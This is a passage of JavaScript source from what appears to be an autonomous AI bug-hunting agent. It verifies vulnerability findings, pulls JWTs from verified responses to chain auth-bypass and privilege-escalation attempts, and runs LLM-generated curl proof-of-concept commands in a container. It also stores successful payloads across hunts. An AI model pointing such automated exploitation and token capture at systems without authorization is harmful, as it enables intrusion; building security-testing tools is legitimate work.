  // novel against the target's baseline bodies. Tightening only — this
  // can reject, never promote; on rejection the finding is recorded
  // unverified with the relevance verdict, so the dead-end registry
  // learns the family like any other validator rejection.
  let rec = { ...gated, verification: v.verdict, verified: v.verified };
  if (v.verified) {
    const baselines = await getTargetBaselines(huntId, target);
    const rel = assessContentRelevance({ command: plan.command, target, output, baselines: baselines || [] });
    if (!baselines) {
      think(huntId, 'Content-relevance: no target baseline obtainable — novelty limb abstained (host + negation limbs still applied).');
    }
    if (!rel.relevant) {
      think(huntId, `Content-relevance FAILED (${rel.reason}) — reproducible but not evidence of this claim; recording as false positive.`);
      rec = { ...gated, verification: `false_positive (content_relevance: ${rel.reason} — FAILED)`, verified: false };
    }
  }
  finding(huntId, rec);
  recordValidation(huntId, plan, rec.verified ? 'verified' : 'rejected', rec.verification);

  // Head records verified findings for the final report
  if (rec.verified) {
    // VARIANT SWEEP (19 Oct 2026): a newly verified class gets its sibling
    // sweep queued — the sweep block in the planning loop picks it up.
    try {
      const vcls = classifyFinding(rec.title);
      if (vcls) {
        const m = readHuntMeta(huntId) || {};
        const vsw = m.variantSweep || { backfilled: false, classes: [] };
        if (!vsw.classes.includes(vcls)) {
          writeHuntMeta(huntId, { ...m, huntId, variantSweep: { ...vsw, classes: [...vsw.classes, vcls] } });
          think(huntId, `New verified class "${vcls}" — variant sweep queued for its sibling vectors.`);
        }
      }
    } catch { /* sweep queue is best-effort */ }
    const head = getOrchestrator(huntId);
    if (head) {
      const verifier = head.spawnWorker('verifier', `Independently confirm: ${rec.title}`);
      head.findings.push(rec);
      head.review(verifier, { ok: true, output: 'reproduced' }, () => true);
      head.saveState();
      think(huntId, `Head: confirmed vulnerability #${head.findings.length} — ${rec.title} (${rec.severity})`);
    }
  }

  // Chain escalation
  if (rec.verified) {
    const chains = beamSearchChains(['data_read']);
    if (chains.length) {
      think(huntId, `Chain opportunity: ${chains[0].path.join(' → ')} (score ${chains[0].score.toFixed(2)})`);
    }
    // CHAIN PURSUIT (19 Oct 2026, solver #105): XBOW's key differentiator is
    // chaining vulnerabilities into working attacks. We detect the chain but
    // must ACT on it, not just think about it. Extract usable artifacts
    // (JWTs, tokens) from the verified finding and store them as chain
    // context so the next planning phase can pursue the chain.
    try {
      const respText = String(rec.evidence?.response || '') + ' ' + String(rec.evidence?.request || '');
      const jwtMatch = respText.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
      // FIX (19 Oct 2026, solver #109): decouple JWT storage from
      // beamSearchChains output (root-caused by solver #108). The chain
      // engine returned [] for the verified SQLi, so chains.length was 0
      // and the JWT was never stored — chain pursuit never fired. The
      // pursuit tests only need artifacts.jwt + chainPath.length > 1, so
      // store the JWT with a default chain path when the engine is silent.
      if (jwtMatch) {
        const chainPath = chains.length ? chains[0].path : ['data_read', 'auth_bypass', 'priv_esc'];
        const chainScore = chains.length ? chains[0].score : 0.5;
        const meta = readHuntMeta(huntId) || {};
        const chainCtx = {
          artifacts: { jwt: jwtMatch[0] },
          chainPath,
          chainScore,
          fromFinding: rec.title,
          createdAt: new Date().toISOString(),
        };
        writeHuntMeta(huntId, { ...meta, huntId, chainContext: chainCtx });
        // FACTS (stage 8): auth state changed — record PRESENCE only.
        // The token value itself is never written to the facts table.
        try { recordFact({ huntId, subject: 'auth', predicate: 'jwt', object: 'present (captured from verified finding)' }); } catch { /* best-effort */ }
        think(huntId, `Chain context stored: have JWT from "${rec.title}", pursuing ${chainPath.join(' → ')}`);
        // GLOBAL MEMORY (19 Oct 2026): chain patterns compound across hunts.
        // A verified finding that yields a usable artifact is a proven link.
        try {
          const gm1 = readHuntMeta(huntId) || {};
          const fp1 = gm1.appFingerprint || { appType: 'unknown', techStack: [] };
          recordGlobalLearning({
            type: 'chain',
            technique: 'chain',
            target: String(target).slice(0, 120),
            appType: fp1.appType || 'unknown',
            techStack: fp1.techStack || [],
            success: true,
            payload: '',
            context: `${rec.title} → artifact extraction → ${chainPath.join(' → ')}`,
            note: 'Chain pattern: a verified finding yielded a usable artifact and pursuit tests were armed with it.',
          });
        } catch { /* global memory is best-effort */ }
      }
    } catch { /* chain context is best-effort */ }
    // PoC generator: turn verified finding into working proof
    await generatePoC(huntId, target, rec);
  }
  // Share verified learnings into the target's long-term memory
  try {
    if (rec && rec.verified) {
      const { writeTargetIntel: _wti } = await import('./store.js');
      _wti(target, { findings: [{ title: rec.title, severity: rec.severity, at: new Date().toISOString() }] });
    }
  } catch { /* memory write must never break the hunt */ }
  // GLOBAL MEMORY (19 Oct 2026): every verified finding teaches ALL future
  // hunts — no model training needed, the intelligence compounds here.
  // Validators are untouched: only genuine verified findings reach this path.
  try {
    if (rec && rec.verified) {
      const gm2 = readHuntMeta(huntId) || {};
      const fp2 = gm2.appFingerprint || { appType: 'unknown', techStack: [] };
      recordGlobalLearning({
        type: 'technique',
        technique: inferTechnique(`${rec.title || ''} ${rec.class || ''} ${plan.test || ''}`),
        target: String(target).slice(0, 120),
        appType: fp2.appType || 'unknown',
        techStack: fp2.techStack || [],
        success: true,
        payload: String(plan.command || (rec.evidence && rec.evidence.request) || '').slice(0, 300),
        context: `${rec.title} (${rec.severity})`,
        note: `Verified ${rec.severity}: ${rec.title}`,
      });
    }
  } catch { /* global memory is best-effort, never break the hunt */ }
  return rec;
}

/**
 * PoC generator (problem #7): ask Bedrock to write a working proof-of-concept
 * for a verified finding, execute it in the container, verify the output.
 */
async function generatePoC(huntId, target, findingRec) {
  try {
    think(huntId, `Generating PoC for: ${findingRec.title}`);
    const reply = await chatWithAI(
      [{
        role: 'user',
        text: `Write a minimal, non-destructive proof-of-concept shell command (curl-based) that demonstrates this vulnerability:\n\nFinding: ${findingRec.title}\nEvidence: ${JSON.stringify(findingRec.evidence).slice(0, 1000)}\n\nTarget: ${target}\n\nReply with ONLY the shell command, no explanation.`,
      }],
      'You are a security researcher writing PoC commands. Output ONLY the command.',
      { huntId }
    );
    if (!reply) return;
    const cmd = reply.trim().split('\n')[0].replace(/^[$>]\s*/, '').slice(0, 500);
    if (!cmd || cmd.length < 10) return;
    think(huntId, 'Executing PoC...');
    const result = await execInHuntContainer(huntId, cmd, 60000);
    const out = (result.stdout || '').slice(0, 1000);
    // FIX (20 Oct 2026, solver #442): this stamped verified:true for ANY PoC
    // output longer than 20 chars — homepage CSS, curl timing printouts and
    // SPA fallback headers all became "PoC confirmed" findings. Require the
    // PoC command to have SUCCEEDED and its output to carry a real impact
    // signal (same vocabulary the finding pipeline uses).
    if (!executionFailed(result, out) && out.trim().length > 20 && extractSignal(out).length > 0) {
      // CONTENT-RELEVANCE (solver #454): the PoC stamp is a verified:true
      // write, so the same binding applies — the PoC must have run against
      // the hunt target, its output's signal must be novel (not the
      // target's ambient page content: the #233/#256/#257 homepage-CSS
      // stamps), non-negated, AND share a signal family with the parent
      // finding it claims to prove (a stack-trace page does not prove a
      // login bypass). Tightening only.
      const baselines = await getTargetBaselines(huntId, target);
      const rel = assessContentRelevance({ command: cmd, target, output: out, baselines: baselines || [] });
      const parentSigs = extractSignal(`${String(findingRec.evidence?.response || '')} ${String(findingRec.evidence?.impact_demo || '')}`).split(',').filter(Boolean);
      const pocSigs = extractSignal(out).split(',').filter(Boolean);
      const sameFamily = pocSigs.some((s) => parentSigs.includes(s));
      if (rel.relevant && sameFamily) {
        appendHuntEvent(huntId, {
          type: 'finding',
          class: 'poc_verified',
          title: `PoC confirmed: ${findingRec.title}`,
          severity: findingRec.severity,
          evidence: { poc_command: cmd, poc_output: out.slice(0, 500) },
          verified: true,
        });
        think(huntId, 'PoC executed — finding confirmed with working proof.');
      } else {
        think(huntId, `PoC output failed content-relevance (${rel.relevant ? `signal family ${pocSigs.join(',') || 'none'} does not match parent finding ${parentSigs.join(',') || 'none'}` : rel.reason}) — not stamping PoC confirmation.`);
      }
    }
  } catch {
    /* PoC is best-effort */
  }
}

/**
 * Run the full autonomous hunt. Called async after hunt creation.
 * Never throws — all failures become hunt events.
 */
export async function runAutonomousHunt(huntId, target, mode = 'normal', userId = null, opts = {}) {
  // FIX (19 Oct 2026, solver #6): Loop-driver mutex — one hunt, one driver.
  // If a loop is already running for this hunt, refuse to start a second.
  if (activeLoops.has(huntId)) {
    think(huntId, 'Loop driver already active for this hunt — refusing duplicate (mutex).');
    return;
  }
  // FIX (19 Oct 2026, elite-gap): cross-process lock — activeLoops is
  // per-process and the watchdog spawns separate node processes.
  const lock = tryAcquireDriverLock(huntId);
  if (!lock.ok) {
    think(huntId, `Loop driver already active for this hunt — refusing duplicate (cross-process lock: ${lock.reason}).`);
    return;
  }
  activeLoops.add(huntId);
  const lockBeat = setInterval(() => touchDriverLock(huntId), DRIVER_LOCK_BEAT_MS);
  try {
    await runAutonomousHuntInner(huntId, target, mode, userId, opts);
  } finally {
    clearInterval(lockBeat);
    activeLoops.delete(huntId);
    releaseDriverLock(huntId);
  }
}

async function runAutonomousHuntInner(huntId, target, mode = 'normal', userId = null, opts = {}) {
  const startIteration = Math.max(1, opts.startIteration || 1);
  const isResume = Boolean(opts.isResume);
  // UNLIMITED HUNTING (owner directive): no iteration cap, no rate limit.
  // The hunt runs until the user stops it or the wallet runs out of money.
  // Money is the ONLY limit.
  // On resume, rebuild findings from the persisted event log so the agent
  // doesn't lose what it already found before the interruption.
  const findings = Array.isArray(opts.findings) ? opts.findings : [];

  try {
    if (isResume) {
      think(huntId, `Checkpoint resume — continuing from iteration ${startIteration} with ${findings.length} finding(s) already recorded. Hunting unlimited until you stop me or credits run out.`);
    } else {
      think(huntId, `Autonomous hunt starting — mode ${mode}. No iteration limit: I hunt until you stop me or the wallet runs out.`);
    }

    if (!(await dockerAvailable())) {
      think(huntId, 'Docker unavailable — running intel-only analysis (no container).');
      appendHuntEvent(huntId, { type: 'status', state: 'degraded', reason: 'no_docker' });
      return;
    }

    // Spawn is done by the route; ensure container exists
    const { container } = await spawnHuntContainer(huntId, target, { mode });
    // MERGE — writeHuntMeta replaces the whole file, so spreading the
    // existing meta preserves userId/target/mode/createdAt. Also mark the
    // hunt running so the status is honest everywhere (list, reports, UI).
    writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, container, state: 'running' });
    appendHuntEvent(huntId, { type: 'status', state: 'container_spawned', container });

    // ORCHESTRATOR: the head of the hunt team. It plans, spawns specialist
    // workers, reviews their work, and writes the final report.
    const head = new HuntOrchestrator(huntId, target, mode);
    orchestrators.set(huntId, head);
    think(huntId, `Head online: I am the lead hacker. Target: ${target}. Assembling my team.`);

    // Phase 1: recon — head spawns a recon specialist worker.
    // FIX (19 Oct 2026, solver #3): recon was never persisted to meta.json —
    // every backend restart/resume re-ran the full recon (nmap + browser +
    // bundle mining, minutes wasted), and a failed resume-time recon left the
    // hunt with zero endpoints so the model hallucinated targets. Persist
    // recon to meta; on resume, reuse it instead of re-scanning.
    const reconWorker = head.spawnWorker('recon', `Map ${target}: open ports, services, tech stack, subdomains, endpoints.`);
    let recon = null;
    if (isResume) {
      const savedRecon = (readHuntMeta(huntId) || {}).recon;
      if (savedRecon && Array.isArray(savedRecon.endpoints) && savedRecon.endpoints.length > 0) {
        recon = savedRecon;
        think(huntId, `Reusing persisted recon: ${recon.endpoints.length} endpoints, tech [${(((recon.detection || {}).techs) || []).join(', ') || 'unknown'}] — no re-scan needed.`);
      }
    }
    if (!recon) {
      recon = await reconPhase(huntId, target);
      try {
        writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, recon });
      } catch { /* recon persist is best-effort */ }
    }
    head.review(reconWorker, { ok: true, output: JSON.stringify(recon).slice(0, 500) }, () => recon && recon.profile);

    // PER-TARGET MEMORY: read what past hunts learned about this target, and
    // save what this hunt discovers. This is the brain's long-term memory —
    // every hunt starts smarter because of every hunt before it.
    let pastIntel = null;
    try {
      pastIntel = readTargetIntel(target);
      if (pastIntel && pastIntel.huntCount > 0) {
        think(huntId, `I remember this target from ${pastIntel.huntCount} past hunt(s). Last: ${pastIntel.lastHuntAt || 'unknown'}. Using past learnings.`);
        // Merge past endpoints into recon so the planner sees them
        const known = (pastIntel.endpoints || []).map((e) => (typeof e === 'string' ? e : e.url || e.path || '')).filter(Boolean);
        const seen = new Set(recon.endpoints);
        for (const ep of known.slice(0, 20)) if (!seen.has(ep)) { recon.endpoints.push(ep); seen.add(ep); }
        if (pastIntel.technologies && pastIntel.technologies.length) {
          recon.pastTechnologies = pastIntel.technologies.slice(0, 10);
        }
      }
      // Save this hunt's fresh recon into shared memory
      writeTargetIntel(target, {
        endpoints: (recon.endpoints || []).slice(0, 30),
        technologies: ((recon.detection && recon.detection.techs) || []).slice(0, 10),
      });
    } catch (err) {
      console.error('[hunt] target intel read/write failed:', err.message);
    }
    recon.pastIntel = pastIntel;
    head.saveState();

    // Learning: what worked on similar targets before?
    let playbook = [];
    try {
      playbook = getPlaybook({ profile: recon.profile });
      if (playbook.length) {
        think(huntId, `Playbook: ${playbook.length} lessons from past hunts on ${recon.profile} targets.`);
      }
    } catch { /* no history yet */ }

    // Business-logic intel: a human hunter thinks "where's the money, where's the trust?"
    // The app model (built in agentIteration) already captures this. Here we just
    // note the business-logic surface for the record — no mechanical checklist.
    try {
      const logic = generateLogicTests(recon.endpoints);
      if (logic.blModules.length) {
        think(huntId, `Business-logic surface: ${logic.blModules.length} areas worth thinking about (not a checklist — follow your instincts).`);
      }
    } catch { /* intel is best-effort */ }

    // Phase 2+: agent loop — UNLIMITED. Stops only when:
    //   1. the user stops it (isStopped),
    //   2. the wallet runs out (chargeIteration returns false → out_of_credits),
    //   3. AI backend or Docker becomes unavailable.
    // There is no iteration cap and no rate limit.
    const hasAI = aiAvailable();
    if (!hasAI) {
      think(huntId, 'No AI backend configured — hunt completed with recon results only.');
    }
    // Consecutive AI failures — circuit breaker trips at 3.
    // We track WHAT failed (not just that it failed) so the pause reason is honest:
    // 'no_reply' = brain gave nothing back, 'error' = the call threw,
    // 'bad_output' = brain replied but produced no usable plan.
    let aiFailStreak = 0;
    let aiFailKinds = [];

    for (let i = startIteration; ; i++) {
      // CHECKPOINT — persist progress every iteration so a killed backend
      // can resume this hunt from here instead of from zero. The per-hunt
      // memory folder (data/hunts/<id>/) is the source of truth.
      try {
        writeHuntMeta(huntId, {
          ...(readHuntMeta(huntId) || {}),
          huntId, iteration: i, phase: 'hunting', state: 'running',
          checkpointAt: new Date().toISOString(),
        });
      } catch { /* checkpoint is best-effort */ }

      if (isStopped(huntId)) {
        think(huntId, 'Hunt stopped by user.');
        break;
      }
      // Operator pause holds the loop here (resume just clears the flag).
      await waitWhilePaused(huntId);
      if (isStopped(huntId)) {
        think(huntId, 'Hunt stopped by user.');
        break;
      }
      // Stop conditions are explicit and user-visible: the operator stops the
      // hunt, or the wallet runs out (out_of_credits pause). No iteration
      // cap, no rate limit, no silent internal caps.
      if (!hasAI) break;
      if (!(await dockerAvailable())) break;

      // Credits gate: each iteration costs a little; pause when the wallet is empty.
      if (!chargeIteration(huntId, userId, mode, i)) break;

      // CIRCUIT BREAKER: if the AI brain fails repeatedly (Ollama too slow
      // on 2vCPU, model down, etc.), pause the hunt with a clear message
      // instead of spinning forever doing nothing.
      let iterResult = null;
      try {
        iterResult = await agentIteration(huntId, target, recon, findings, i, playbook);
      } catch (err) {
        // DIAG (18 Oct 2026): log the stack's first frames so a recurring
        // ReferenceError (e.g. "reply is not defined") reveals its exact
        // file:line instead of failing silently 8+ iterations in a row.
        const stackHint = err && err.stack ? String(err.stack).split('\n').slice(1, 4).join(' <- ').slice(0, 400) : 'no-stack';
        think(huntId, `Iteration ${i} failed safely: ${err.message || err} :: ${stackHint}`);
      }
      if (iterResult === null || (iterResult && iterResult.aiOk === false)) {
        aiFailStreak++;
        aiFailKinds.push((iterResult && iterResult.failKind) || 'unknown');
        // Circuit breaker trips at 5 consecutive failures (was 3). The 8B model
        // on 2vCPU is flaky — occasional malformed JSON or slow replies are
        // normal, not a brain outage. 5 still stops a truly dead brain quickly.
        if (aiFailStreak >= 5) {
          // Honest pause reason: report WHAT failed, not a blanket "unreachable".
          // 'ai_no_reply' = brain gave nothing back (timeout/wedge),
          // 'ai_error' = the brain call threw, 'ai_bad_output' = brain replied
          // but produced no usable plan (a model-quality issue, not downtime).
          const kinds = aiFailKinds.slice(-3);
          const topKind = kinds
            .slice()
            .sort((a, b) => kinds.filter((k) => k === b).length - kinds.filter((k) => k === a).length)[0] || 'unknown';
          const pauseReason = `ai_${topKind}`;
          const kindLabels = {
            no_reply: 'AI brain gave no reply',
            error: 'AI brain call threw an error',
            bad_output: 'AI brain replied but produced no usable plan',
            unknown: 'AI brain failed',
          };
          const label = kindLabels[topKind] || kindLabels.unknown;
          think(huntId, `${label} ${aiFailStreak}x in a row — pausing hunt. Resume when it's responsive.`);
          appendHuntEvent(huntId, { type: 'status', state: 'paused', reason: pauseReason, at: new Date().toISOString() });
          try {
            writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, state: 'paused', pausedReason: pauseReason });
          } catch { /* best-effort */ }
          // Return early — do NOT fall through to "finished". This hunt is
          // paused, not done. Resume will pick up from the checkpoint.
          try {
            await teardownHuntContainer(huntId);
            appendHuntEvent(huntId, { type: 'status', state: 'container_destroyed' });
          } catch { /* ignore */ }
          return;
        }
      } else {
        aiFailStreak = 0;
        aiFailKinds = [];
      }

      // Gentle pacing — don't hammer the target
      await new Promise((r) => setTimeout(r, 2000));
    }

    // Final analysis over all findings
    try {
      const analysis = analyzeFindings(findings);
      appendHuntEvent(huntId, { type: 'status', state: 'analysis', summary: analysis });
    } catch { /* ignore */ }

    // Learning: record what worked so future hunts get smarter
    try {
      recordHuntExperience({
        huntId,
        target,
        profile: { type: recon.profile },
        techniques: findings.map((f) => ({ name: f.class || 'unknown', triedAt: new Date().toISOString() })),
        findings,
      });
      think(huntId, 'Hunt experience recorded — future hunts learn from this one.');
    } catch { /* ignore */ }

    think(huntId, `Hunt finished: ${findings.length} findings (${findings.filter((f) => f.verified).length} verified).`);
    appendHuntEvent(huntId, { type: 'status', state: 'finished', findings: findings.length });
    try {
      writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, state: 'finished' });
    } catch { /* meta is best-effort here */ }

    // QUEUE: auto-start next hunt if queued
    try {
      const { dequeueNextHunt } = await import('./store.js');
      const next = dequeueNextHunt();
      if (next) {
        console.log(`[hunt] Queue: auto-starting ${next.queueId} for ${next.username} (target: ${next.target})`);
        // Import and call the hunt creation (deferred to avoid circular imports)
        const { default: createHunt } = await import('./huntCreator.js').catch(() => ({ default: null }));
        if (createHunt) {
          createHunt(next).catch((err) => console.error('[hunt] queue auto-start failed:', err.message));
        } else {
          // Fallback: log for manual start (huntCreator not yet implemented)
          console.log(`[hunt] Queue: next hunt ready (manual): ${JSON.stringify(next)}`);
        }
      }
    } catch (err) {
      console.error('[hunt] queue auto-start check failed:', err.message);
    }
  } catch (err) {
    appendHuntEvent(huntId, { type: 'status', state: 'failed', error: err.message || String(err) });
    try {
      writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, state: 'failed' });
    } catch { /* meta is best-effort here */ }
  } finally {
    // Always clean up the container
    try {
      await teardownHuntContainer(huntId);
      appendHuntEvent(huntId, { type: 'status', state: 'container_destroyed' });
    } catch { /* ignore */ }
  }
}

/**
 * Resume a hunt that was interrupted (backend killed/restarted mid-run).
 * Reads the checkpoint from the hunt's memory folder (meta.json) and the
 * findings from the persisted event log, then continues the agent loop from
 * the next iteration — never from zero.
 *
 * Returns true if a resume was launched, false if there was nothing to resume
 * (hunt already stopped/finished/paused, or no checkpoint).
 */
export async function resumeInterruptedHunt(huntId) {
  const meta = readHuntMeta(huntId);
  if (!meta || meta.state !== 'running') return false;
  // FIX (solver #458): a hunt whose driver is already active is NOT
  // interrupted. The periodic reconciler in server.js calls this for every
  // 'running' meta every 60 s; without this guard each call appended a
  // spurious 'resumed_from_checkpoint' event, launched runAutonomousHunt
  // only for the mutex to refuse it with a think line, and still returned
  // true — so the scan logged a "resumed from checkpoint" success every
  // minute for a hunt that was never interrupted. Returning false here
  // keeps the scan silent for live hunts; a genuinely interrupted hunt
  // (no active loop, dead lock pid, or stale heartbeat) still resumes
  // exactly as before.
  if (isDriverActive(huntId)) return false;
  // Clear stale pause indicators — a resume is an explicit un-pause.
  // If pausedReason is left set, isPaused() returns true (defensive fix)
  // and the loop gets stuck in waitWhilePaused() instead of hunting.
  if (meta.pausedReason || meta.paused) {
    writeHuntMeta(huntId, { ...meta, paused: false, pausedReason: null });
  }
  const { target, mode, userId } = meta;
  if (!target) return false;

  // Rebuild findings from the persisted event log (strip the event wrapper).
  const findings = [];
  try {
    for (const e of readHuntEvents(huntId)) {
      if (e && e.type === 'finding') {
        const { type, cachedAt, ...f } = e;
        findings.push(f);
      }
    }
  } catch { /* findings are best-effort */ }

  const lastIteration = Number(meta.iteration) || 0;
  appendHuntEvent(huntId, {
    type: 'status',
    state: 'resumed_from_checkpoint',
    fromIteration: lastIteration + 1,
    findingsRecovered: findings.length,
    at: new Date().toISOString(),
  });
  // Fire and forget — the loop drives itself from here.
  runAutonomousHunt(huntId, target, mode || 'normal', userId || null, {
    isResume: true,
    startIteration: lastIteration + 1,
    findings,
  }).catch((err) => {
    appendHuntEvent(huntId, { type: 'status', state: 'failed', error: err.message || String(err) });
    try {
      writeHuntMeta(huntId, { ...(readHuntMeta(huntId) || {}), huntId, state: 'failed' });
    } catch { /* ignore */ }
  });
  return true;
}
